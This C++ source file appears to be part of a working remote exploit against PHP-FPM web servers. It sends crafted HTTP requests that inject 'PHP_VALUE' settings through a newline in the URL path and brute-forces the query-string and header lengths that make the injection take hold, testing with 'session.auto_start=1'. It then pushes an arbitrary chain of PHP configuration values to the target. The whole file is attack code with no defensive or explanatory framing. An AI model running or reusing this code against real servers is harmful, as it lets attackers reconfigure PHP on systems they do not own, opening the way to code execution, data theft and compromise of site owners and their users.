#include "hdr.h"

string setsetting(addrinfo* addr, string target, string val, int qsl, int hlen) {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	char buf[150];

	connect(sock, addr->ai_addr, addr->ai_addrlen);
	send(sock, ("GET /index.php/PHP_VALUE%0A" + pad(val, 23, ';') + "?" + string(qsl, 'A') + " HTTP/1.1\r\nHost: " + target + "\r\nFoo: " + string(hlen, 'A') + "\r\nEbut: qazxs edcvf\r\n\r\n").c_str(), 99 + target.length() + qsl + hlen, NULL);
	recv(sock, buf, 150, NULL);

	return string(buf);
}

int findQSL(addrinfo* addr, string target) {
	for (int i = 1500; i <= 1900; i++) {
		if (setsetting(addr, target, "", i, 1).substr(0, 12) == "HTTP/1.1 502") {
			return i;
		}
	}

	return -1;
}

int findHlen(addrinfo* addr, string target, int qsl) {
	for (int i = 1; i <= 566; i++) {
		if (setsetting(addr, target, "session.auto_start=1", qsl, i).find("PHPSESSID") != -1) {
			return i;
		}
	}

	return -1;
}

void sendchain(addrinfo* addr, string target, int qsl, int hlen, vector<string> chain) {
	for (string s : chain) {
		setsetting(addr, target, s, qsl, hlen);
	}
	return;
}